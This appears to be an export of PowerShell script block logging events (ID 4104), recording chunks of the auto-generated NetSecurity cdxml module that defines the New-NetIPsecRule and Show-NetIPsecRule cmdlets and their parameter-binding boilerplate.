          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:InterfaceType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:InterfaceType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:CreateInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'New-NetIPsecRule' -Alias '*'
        

function Show-NetIPsecRule
{
    [CmdletBinding(PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance[]])][OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/NetSecurityDeepEnumElement')]
    param(
    
    [Parameter(ParameterSetName='EnumerateFull1')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='EnumerateFull1')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='EnumerateFull1')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='EnumerateFull1')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='EnumerateFull1')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PolicyStore')) {
          [object]$__cmdletization_value = ${PolicyStore}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('GPOSession')) {
          [object]$__cmdletization_value = ${GPOSession}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdle

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (2 of 23):
rameter]@{Name = 'Profiles'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Platform')) {
          [object]$__cmdletization_value = ${Platform}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platforms'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platforms'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Mode')) {
          [object]$__cmdletization_value = ${Mode}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Mode'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecMode'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Mode'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecMode'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('InboundSecurity')) {
          [object]$__cmdletization_value = ${InboundSecurity}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InboundSecurity'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InboundSecurity'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('OutboundSecurity')) {
          [object]$__cmdletization_value = ${OutboundSecurity}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'OutboundSecurity'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'OutboundSecurity'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('QuickModeCryptoSet')) {
          [object]$__cmdletization_value = ${QuickModeCryptoSet}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuickModeCryptoSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuickModeCryptoSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Phase1AuthSet')) {
          [object]$__cmdletization_value = ${Phase1AuthSet}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Phase1AuthSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Phase1AuthSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Phase2AuthSet')) {
          [object]$__cmdletization_value = ${Phase2AuthSet}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Phase2AuthSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Phase2AuthSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('KeyModule')) {
          [object]$__cmdletization_value = ${KeyModule}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'KeyModule'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyModule'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'KeyModule'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyModule'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowWatchKey')) {
          [object]$__cmdletization_value = ${AllowWatchKey}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowWatchKey'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowWatchKey'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowSetKey')) {
          [object]$__cmdletization_value = ${AllowSetKey}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSetKey'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSetKey'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LocalTunnelEndpoint')) {
          [object]$__cmdletization_value = ${LocalTunnelEndpoint}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalTunnelEndpoint'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalTunnelEndpoint'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemoteTunnelEndpoint')) {
          [object]$__cmdletization_value = ${RemoteTunnelEndpoint}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteTunnelEndpoint'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteTunnelEndpoint'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemoteTunnelHostname')) {
          [object]$__cmdletization_value = ${RemoteTunnelHostname}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteTunnelEndpointDNSName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteTunnelEndpointDNSName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ForwardPathLifetime')) {
          [object]$__cmdletization_value = ${ForwardPathLifetime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxReturnPathLifetimeSeconds'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxReturnPathLifetimeSeconds'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EncryptedTunnelBypass')) {
          [object]$__cmdletization_value = ${EncryptedTunnelBypass}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BypassTunnelIfEncrypted'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BypassTunnelIfEncrypted'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_def

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 23):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetConSecRule'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function New-NetIPsecRule
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='cim:CreateInstance0', ValueFromPipelineByPropertyName=$true)]
    [Alias('ID','Name')]
    [string]
    ${IPsecRuleName},

    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true)]
    [string]
    ${DisplayName},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Description},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Group},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled]
    ${Enabled},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile]
    ${Profile},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${Platform},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecMode]
    ${Mode},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('SecIn')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy]
    ${InboundSecurity},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('SecOut')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy]
    ${OutboundSecurity},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${QuickModeCryptoSet},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Phase2AuthSet},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyModule]
    ${KeyModule},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [bool]
    ${AllowWatchKey},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [bool]
    ${AllowSetKey},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${LocalTunnelEndpoint},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${RemoteTunnelEndpoint},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${RemoteTunnelHostname},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint32]
    ${ForwardPathLifetime},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [bool]
    ${EncryptedTunnelBypass},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [bool]
    ${RequireAuthorization},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${User},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Machine},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${LocalAddress},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${RemoteAddress},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Protocol},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${LocalPort},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${RemotePort},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [WildcardPattern[]]
    ${InterfaceAlias},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType]
    ${InterfaceType},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PolicyStore')) {
          [object]$__cmdletization_value = ${PolicyStore}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('GPOSession')) {
          [object]$__cmdletization_value = ${GPOSession}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('IPsecRuleName')) {
          [object]$__cmdletization_value = ${IPsecRuleName}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisplayName')) {
          [object]$__cmdletization_value = ${DisplayName}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Description')) {
          [object]$__cmdletization_value = ${Description}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Group')) {
          [object]$__cmdletization_value = ${Group}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RuleGroup'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RuleGroup'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Enabled')) {
          [object]$__cmdletization_value = ${Enabled}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Profile')) {
          [object]$__cmdletization_value = ${Profile}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profiles'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
